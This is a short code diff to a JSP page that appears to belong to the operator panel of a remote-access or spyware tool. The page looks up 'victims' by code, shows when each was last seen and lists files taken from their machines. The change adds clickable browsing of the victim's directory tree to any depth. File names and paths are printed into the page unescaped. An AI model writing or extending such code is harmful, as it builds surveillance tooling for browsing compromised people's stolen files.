@@ -41,9 +41,9 @@
     <%
         try {
 
-            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 2);
+            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, PathInfo.UNLIMITED);
             final String victimCode = pathInfoUtils.getPart(1);
-            String fileParentId = pathInfoUtils.getPart(2, "0");
+            final String fileParentId = pathInfoUtils.getLastPart("0");
 
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
@@ -79,7 +79,7 @@
                         theVictim.getIdentity(),
                         lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")")%>
 
-                <table id="tDeliveries" class="table table-bordered table-condensed">
+                <table id="tFiles" class="table table-bordered table-condensed">
                     <tr>
                         <th>File name</th>
                         <th>Size</th>
@@ -88,10 +88,25 @@
                     <%
                         for (final File file : files) {
                     %>
-                    <tr class="delivery_row">
-                        <td><%=file.getFileName()%>
+                    <tr class="files">
+
+                        <td><%
+                            if (file.isDirectory()) {
+                        %>
+                            <abbr title="<%=file.getAbsoluteParentPath()%>">
+                                <a href="/client/victim/files/<%=victimCode+"/"+file.getAbsoluteParentPath()+"/"+file.getId()%>"><%=file.getFileName()%>
+                                </a>
+                            </abbr>
+
+                            <%
+                            } else {
+                            %>
+                            <%=file.getFileName()%>
+                            <%
+                                }
+                            %>
                         </td>
-                        <td><%=file.getFileSizeInKB()%>
+                        <td><%=file.getFileSizeInKB()%>KB
                         </td>
                     </tr>
                     <%
